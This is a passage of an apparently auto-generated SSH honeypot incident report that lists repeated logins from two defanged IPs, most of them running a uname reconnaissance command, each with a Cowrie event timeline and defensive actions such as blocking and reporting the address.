- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad9cc7c7d648

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:31 |
| **Last Seen** | 2026-08-24 01:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:31:31` | `cowrie.session.connect` |
| `2026-08-24 01:31:31` | `cowrie.client.version` |
| `2026-08-24 01:31:31` | `cowrie.client.kex` |
| `2026-08-24 01:31:31` | `cowrie.login.success` |
| `2026-08-24 01:31:32` | `cowrie.session.params` |
| `2026-08-24 01:31:32` | `cowrie.command.input` |
| `2026-08-24 01:31:32` | `cowrie.log.closed` |
| `2026-08-24 01:31:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80bcffe4dc4c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:31 |
| **Last Seen** | 2026-08-24 01:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:31:36` | `cowrie.session.connect` |
| `2026-08-24 01:31:36` | `cowrie.client.version` |
| `2026-08-24 01:31:36` | `cowrie.client.kex` |
| `2026-08-24 01:31:36` | `cowrie.login.success` |
| `2026-08-24 01:31:37` | `cowrie.session.params` |
| `2026-08-24 01:31:37` | `cowrie.command.input` |
| `2026-08-24 01:31:37` | `cowrie.log.closed` |
| `2026-08-24 01:31:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3ab8f12e5c5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:31 |
| **Last Seen** | 2026-08-24 01:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:31:41` | `cowrie.session.connect` |
| `2026-08-24 01:31:41` | `cowrie.client.version` |
| `2026-08-24 01:31:41` | `cowrie.client.kex` |
| `2026-08-24 01:31:41` | `cowrie.login.success` |
| `2026-08-24 01:31:42` | `cowrie.session.params` |
| `2026-08-24 01:31:42` | `cowrie.command.input` |
| `2026-08-24 01:31:42` | `cowrie.log.closed` |
| `2026-08-24 01:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-842178428379

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:31 |
| **Last Seen** | 2026-08-24 01:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:31:46` | `cowrie.session.connect` |
| `2026-08-24 01:31:46` | `cowrie.client.version` |
| `2026-08-24 01:31:46` | `cowrie.client.kex` |
| `2026-08-24 01:31:46` | `cowrie.login.success` |
| `2026-08-24 01:31:47` | `cowrie.session.params` |
| `2026-08-24 01:31:47` | `cowrie.command.input` |
| `2026-08-24 01:31:47` | `cowrie.log.closed` |
| `2026-08-24 01:31:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e1978b64615

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:31 |
| **Last Seen** | 2026-08-24 01:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:31:51` | `cowrie.session.connect` |
| `2026-08-24 01:31:51` | `cowrie.client.version` |
| `2026-08-24 01:31:51` | `cowrie.client.kex` |
| `2026-08-24 01:31:52` | `cowrie.login.success` |
| `2026-08-24 01:31:52` | `cowrie.session.params` |
| `2026-08-24 01:31:52` | `cowrie.command.input` |
| `2026-08-24 01:31:53` | `cowrie.log.closed` |
| `2026-08-24 01:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c070865d93b1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:31 |
| **Last Seen** | 2026-08-24 01:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:31:56` | `cowrie.session.connect` |
| `2026-08-24 01:31:56` | `cowrie.client.version` |
| `2026-08-24 01:31:56` | `cowrie.client.kex` |
| `2026-08-24 01:31:57` | `cowrie.login.success` |
| `2026-08-24 01:31:58` | `cowrie.session.params` |
| `2026-08-24 01:31:58` | `cowrie.command.input` |
| `2026-08-24 01:31:58` | `cowrie.log.closed` |
| `2026-08-24 01:31:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a817345c6e53

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:32 |
| **Last Seen** | 2026-08-24 01:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:32:01` | `cowrie.session.connect` |
| `2026-08-24 01:32:01` | `cowrie.client.version` |
| `2026-08-24 01:32:02` | `cowrie.client.kex` |
| `2026-08-24 01:32:02` | `cowrie.login.success` |
| `2026-08-24 01:32:03` | `cowrie.session.params` |
| `2026-08-24 01:32:03` | `cowrie.command.input` |
| `2026-08-24 01:32:03` | `cowrie.log.closed` |
| `2026-08-24 01:32:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf4ccd52ffbe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:32 |
| **Last Seen** | 2026-08-24 01:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:32:07` | `cowrie.session.connect` |
| `2026-08-24 01:32:07` | `cowrie.client.version` |
| `2026-08-24 01:32:07` | `cowrie.client.kex` |
| `2026-08-24 01:32:07` | `cowrie.login.success` |
| `2026-08-24 01:32:08` | `cowrie.session.params` |
| `2026-08-24 01:32:08` | `cowrie.command.input` |
| `2026-08-24 01:32:08` | `cowrie.log.closed` |
| `2026-08-24 01:32:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-541c269e74cd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:32 |
| **Last Seen** | 2026-08-24 01:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:32:12` | `cowrie.session.connect` |
| `2026-08-24 01:32:12` | `cowrie.client.version` |
| `2026-08-24 01:32:12` | `cowrie.client.kex` |
| `2026-08-24 01:32:12` | `cowrie.login.success` |
| `2026-08-24 01:32:13` | `cowrie.session.params` |
| `2026-08-24 01:32:13` | `cowrie.command.input` |
| `2026-08-24 01:32:13` | `cowrie.log.closed` |
| `2026-08-24 01:32:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bde610d4c111

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:32 |
| **Last Seen** | 2026-08-24 01:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:32:17` | `cowrie.session.connect` |
| `2026-08-24 01:32:17` | `cowrie.client.version` |
| `2026-08-24 01:32:17` | `cowrie.client.kex` |
| `2026-08-24 01:32:17` | `cowrie.login.success` |
| `2026-08-24 01:32:20` | `cowrie.session.params` |
| `2026-08-24 01:32:20` | `cowrie.command.input` |
| `2026-08-24 01:32:20` | `cowrie.log.closed` |
| `2026-08-24 01:32:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33db138b69b3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:32 |
| **Last Seen** | 2026-08-24 01:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:32:22` | `cowrie.session.connect` |
| `2026-08-24 01:32:22` | `cowrie.client.version` |
| `2026-08-24 01:32:22` | `cowrie.client.kex` |
| `2026-08-24 01:32:23` | `cowrie.login.success` |
| `2026-08-24 01:32:24` | `cowrie.session.params` |
| `2026-08-24 01:32:24` | `cowrie.command.input` |
| `2026-08-24 01:32:25` | `cowrie.log.closed` |
| `2026-08-24 01:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13aadfaadbe4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:32 |
| **Last Seen** | 2026-08-24 01:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:32:27` | `cowrie.session.connect` |
| `2026-08-24 01:32:27` | `cowrie.client.version` |
| `2026-08-24 01:32:27` | `cowrie.client.kex` |
| `2026-08-24 01:32:28` | `cowrie.login.success` |
| `2026-08-24 01:32:29` | `cowrie.session.params` |
| `2026-08-24 01:32:29` | `cowrie.command.input` |
| `2026-08-24 01:32:30` | `cowrie.log.closed` |
| `2026-08-24 01:32:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-708a3b95facb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:32 |
| **Last Seen** | 2026-08-24 01:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:32:32` | `cowrie.session.connect` |
| `2026-08-24 01:32:33` | `cowrie.client.version` |
| `2026-08-24 01:32:33` | `cowrie.client.kex` |
| `2026-08-24 01:32:33` | `cowrie.login.success` |
| `2026-08-24 01:32:35` | `cowrie.session.params` |
| `2026-08-24 01:32:35` | `cowrie.command.input` |
| `2026-08-24 01:32:35` | `cowrie.log.closed` |
| `2026-08-24 01:32:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bb73c14fb5d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:32 |
| **Last Seen** | 2026-08-24 01:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:32:38` | `cowrie.session.connect` |
| `2026-08-24 01:32:38` | `cowrie.client.version` |
| `2026-08-24 01:32:38` | `cowrie.client.kex` |
| `2026-08-24 01:32:38` | `cowrie.login.success` |
| `2026-08-24 01:32:40` | `cowrie.session.params` |
| `2026-08-24 01:32:40` | `cowrie.command.input` |
| `2026-08-24 01:32:40` | `cowrie.log.closed` |
| `2026-08-24 01:32:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e8cd91e5517

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:32 |
| **Last Seen** | 2026-08-24 01:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:32:43` | `cowrie.session.connect` |
| `2026-08-24 01:32:43` | `cowrie.client.version` |
| `2026-08-24 01:32:43` | `cowrie.client.kex` |
| `2026-08-24 01:32:43` | `cowrie.login.success` |
| `2026-08-24 01:32:45` | `cowrie.session.params` |
| `2026-08-24 01:32:45` | `cowrie.command.input` |
| `2026-08-24 01:32:45` | `cowrie.log.closed` |
| `2026-08-24 01:32:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea856da11cbf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:32 |
| **Last Seen** | 2026-08-24 01:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:32:48` | `cowrie.session.connect` |
| `2026-08-24 01:32:48` | `cowrie.client.version` |
| `2026-08-24 01:32:48` | `cowrie.client.kex` |
| `2026-08-24 01:32:48` | `cowrie.login.success` |
| `2026-08-24 01:32:50` | `cowrie.session.params` |
| `2026-08-24 01:32:50` | `cowrie.command.input` |
| `2026-08-24 01:32:50` | `cowrie.log.closed` |
| `2026-08-24 01:32:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-704bf7e14d8a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:32 |
| **Last Seen** | 2026-08-24 01:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:32:53` | `cowrie.session.connect` |
| `2026-08-24 01:32:54` | `cowrie.client.version` |
| `2026-08-24 01:32:54` | `cowrie.client.kex` |
| `2026-08-24 01:32:54` | `cowrie.login.success` |
| `2026-08-24 01:32:56` | `cowrie.session.params` |
| `2026-08-24 01:32:56` | `cowrie.command.input` |
| `2026-08-24 01:32:56` | `cowrie.log.closed` |
| `2026-08-24 01:32:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59635123d263

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:32 |
| **Last Seen** | 2026-08-24 01:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:32:59` | `cowrie.session.connect` |
| `2026-08-24 01:32:59` | `cowrie.client.version` |
| `2026-08-24 01:32:59` | `cowrie.client.kex` |
| `2026-08-24 01:32:59` | `cowrie.login.success` |
| `2026-08-24 01:33:00` | `cowrie.session.params` |
| `2026-08-24 01:33:00` | `cowrie.command.input` |
| `2026-08-24 01:33:00` | `cowrie.log.closed` |
| `2026-08-24 01:33:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a62c48b8696

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:33 |
| **Last Seen** | 2026-08-24 01:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:33:04` | `cowrie.session.connect` |
| `2026-08-24 01:33:04` | `cowrie.client.version` |
| `2026-08-24 01:33:04` | `cowrie.client.kex` |
| `2026-08-24 01:33:05` | `cowrie.login.success` |
| `2026-08-24 01:33:06` | `cowrie.session.params` |
| `2026-08-24 01:33:06` | `cowrie.command.input` |
| `2026-08-24 01:33:06` | `cowrie.log.closed` |
| `2026-08-24 01:33:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30c540000d4e

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-24 01:33 |
| **Last Seen** | 2026-08-24 01:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:33:08` | `cowrie.session.connect` |
| `2026-08-24 01:33:08` | `cowrie.client.version` |
| `2026-08-24 01:33:09` | `cowrie.client.kex` |
| `2026-08-24 01:33:09` | `cowrie.login.success` |
| `2026-08-24 01:33:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29a1b57e7fb1

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-24 01:33 |
| **Last Seen** | 2026-08-24 01:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:33:08` | `cowrie.session.connect` |
| `2026-08-24 01:33:08` | `cowrie.client.version` |
| `2026-08-24 01:33:09` | `cowrie.client.kex` |
| `2026-08-24 01:33:09` | `cowrie.login.success` |
| `2026-08-24 01:33:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69e438815265

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:33 |
| **Last Seen** | 2026-08-24 01:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:33:09` | `cowrie.session.connect` |
| `2026-08-24 01:33:09` | `cowrie.client.version` |
| `2026-08-24 01:33:09` | `cowrie.client.kex` |
| `2026-08-24 01:33:10` | `cowrie.login.success` |
| `2026-08-24 01:33:11` | `cowrie.session.params` |
| `2026-08-24 01:33:11` | `cowrie.command.input` |
| `2026-08-24 01:33:11` | `cowrie.log.closed` |
| `2026-08-24 01:33:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-336d656de31c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:33 |
| **Last Seen** | 2026-08-24 01:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:33:14` | `cowrie.session.connect` |
| `2026-08-24 01:33:15` | `cowrie.client.version` |
| `2026-08-24 01:33:15` | `cowrie.client.kex` |
| `2026-08-24 01:33:15` | `cowrie.login.success` |
| `2026-08-24 01:33:16` | `cowrie.session.params` |
| `2026-08-24 01:33:16` | `cowrie.command.input` |
| `2026-08-24 01:33:16` | `cowrie.log.closed` |
| `2026-08-24 01:33:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2362db3ac20

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:33 |
| **Last Seen** | 2026-08-24 01:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:33:20` | `cowrie.session.connect` |
| `2026-08-24 01:33:20` | `cowrie.client.version` |
| `2026-08-24 01:33:20` | `cowrie.client.kex` |
| `2026-08-24 01:33:20` | `cowrie.login.success` |
| `2026-08-24 01:33:21` | `cowrie.session.params` |
| `2026-08-24 01:33:21` | `cowrie.command.input` |
| `2026-08-24 01:33:21` | `cowrie.log.closed` |
| `2026-08-24 01:33:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-588c5dab7efe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:33 |
| **Last Seen** | 2026-08-24 01:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:33:25` | `cowrie.session.connect` |
| `2026-08-24 01:33:25` | `cowrie.client.version` |
| `2026-08-24 01:33:25` | `cowrie.client.kex` |
| `2026-08-24 01:33:25` | `cowrie.login.success` |
| `2026-08-24 01:33:26` | `cowrie.session.params` |
| `2026-08-24 01:33:26` | `cowrie.command.input` |
| `2026-08-24 01:33:26` | `cowrie.log.closed` |
| `2026-08-24 01:33:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a72b5ccc121

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:33 |
| **Last Seen** | 2026-08-24 01:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:33:30` | `cowrie.session.connect` |
| `2026-08-24 01:33:30` | `cowrie.client.version` |
| `2026-08-24 01:33:30` | `cowrie.client.kex` |
| `2026-08-24 01:33:31` | `cowrie.login.success` |
| `2026-08-24 01:33:31` | `cowrie.session.params` |
| `2026-08-24 01:33:31` | `cowrie.command.input` |
| `2026-08-24 01:33:32` | `cowrie.log.closed` |
| `2026-08-24 01:33:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
